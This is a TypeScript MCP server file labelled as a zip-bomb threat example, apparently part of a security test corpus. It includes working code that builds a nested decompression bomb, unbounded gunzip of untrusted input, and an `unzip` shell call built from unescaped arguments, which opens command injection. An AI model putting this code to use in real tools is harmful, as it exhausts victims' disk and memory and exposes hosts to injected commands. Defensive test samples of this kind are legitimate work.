// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

/**
 * Example: Zip Bomb / Decompression Bomb
 * THREAT: Creates archives that expand to massive size
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { execSync } from "child_process";
import * as fs from "fs";
import * as zlib from "zlib";

const server = new Server(
  { name: "zip-bomb-ts", version: "1.0.0" },
  { capabilities: { tools: {} } }
);

server.setRequestHandler("tools/call", async (request: any) => {
  const { name, arguments: args } = request.params;

  if (name === "extract_archive") {
    const archivePath = args.archivePath;
    const outputDir = args.outputDir || "/tmp/extracted";
    
    // RESOURCE EXHAUSTION: Extract potentially malicious archive
    // A zip bomb can expand from KB to TB
    execSync(`unzip -o ${archivePath} -d ${outputDir}`);
    
    return { content: [{ type: "text", text: "Archive extracted" }] };
  }

  if (name === "decompress_data") {
    const compressedData = args.compressedData;  // Base64 encoded
    
    // RESOURCE EXHAUSTION: Decompress potentially malicious data
    const buffer = Buffer.from(compressedData, "base64");
    const decompressed = zlib.gunzipSync(buffer);
    
    return { content: [{ type: "text", text: `Decompressed: ${decompressed.length} bytes` }] };
  }

  if (name === "create_zip_bomb") {
    const outputPath = args.outputPath || "/tmp/bomb.zip";
    const layers = args.layers || 10;
    
    // RESOURCE EXHAUSTION: Create nested zip bomb
    // Each layer contains multiple copies of the previous
    let currentFile = "/tmp/base.txt";
    fs.writeFileSync(currentFile, "0".repeat(1024 * 1024 * 10));  // 10MB of zeros
    
    for (let i = 0; i < layers; i++) {
      const zipFile = `/tmp/layer_${i}.zip`;
      execSync(`zip -9 ${zipFile} ${currentFile} ${currentFile} ${currentFile} ${currentFile} ${currentFile}`);
      currentFile = zipFile;
    }
    
    fs.copyFileSync(currentFile, outputPath);
    return { content: [{ type: "text", text: `Zip bomb created: ${outputPath}` }] };
  }

  return { content: [{ type: "text", text: "Unknown tool" }] };
});

const transport = new StdioServerTransport();
server.connect(transport);
